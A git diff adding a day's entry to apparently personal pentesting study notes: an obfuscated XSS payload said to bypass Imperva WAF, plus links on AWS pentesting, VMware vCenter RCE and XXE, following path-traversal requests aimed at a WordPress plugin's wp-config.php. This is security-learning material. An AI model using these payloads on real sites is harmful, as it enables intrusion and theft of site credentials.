@@ -188,3 +188,27 @@ GET /wp-content/plugins/BackUp/Archive.php?bkpwp_plugin_path=..%2F..%2F..%2Fwp-c
 GET /wp-content/plugins/BackUp/Archive/Predicate.php?bkpwp_plugin_path=..%2F..%2F..%2F..%2Fwp-config.php 
 GET /wp-content/plugins/BackUp/Archive/Reader.php?bkpwp_plugin_path=..%2F..%2F..%2F..%2Fwp-config.php
 ```
+
+# 📅 25-Feb-2021
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 56
+- [Testing IIS Servers](https://twitter.com/harshbothra_/status/1364681793274744833?s=20)
+
+## A solid XSS payload that bypasses Imperva WAF
+```js
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
+```
+## AWS pentesting
+- https://twitter.com/iamthefrogy/status/1364528706233004034?s=20
+![img](https://pbs.twimg.com/media/Eu_HKLiWQAIDeq5?format=png&name=large)
+
+## Infosec Talks
+- https://securib.ee/beelog/must-watch-infosec-talks-of-2020/
+
+## Unauthorized RCE in VMware vCenter
+- https://swarm.ptsecurity.com/unauth-rce-vmware/
+
+## Top 10 web hacking techniques of 2020
+- https://portswigger.net/research/top-10-web-hacking-techniques-of-2020
+
+## Exploiting Out-Of-Band XXE on Wildfire
+- https://dhiyaneshgeek.github.io/web/security/2021/02/19/exploiting-out-of-band-xxe/
